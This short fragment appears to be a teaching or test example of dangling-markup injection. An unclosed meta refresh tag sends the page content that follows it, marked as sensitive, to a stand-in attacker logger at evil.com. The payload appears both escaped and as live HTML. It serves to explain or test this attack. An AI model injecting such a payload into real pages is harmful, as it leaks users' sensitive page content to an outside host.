Unclosed meta tag<br>
Suppose the attacker was able to inject the following into a vulnerable input: &quot;"&gt;&lt;meta http-equiv="refresh" content='15; url="http://evil.com/logger.php?log=<br>

<input name="test" value="hack"><meta http-equiv="refresh" content='15; url="http://evil.com/logger.php?log=
<br>
some sensitive content<br>
<form action=/action.php/>
<br>some text with a bracket '
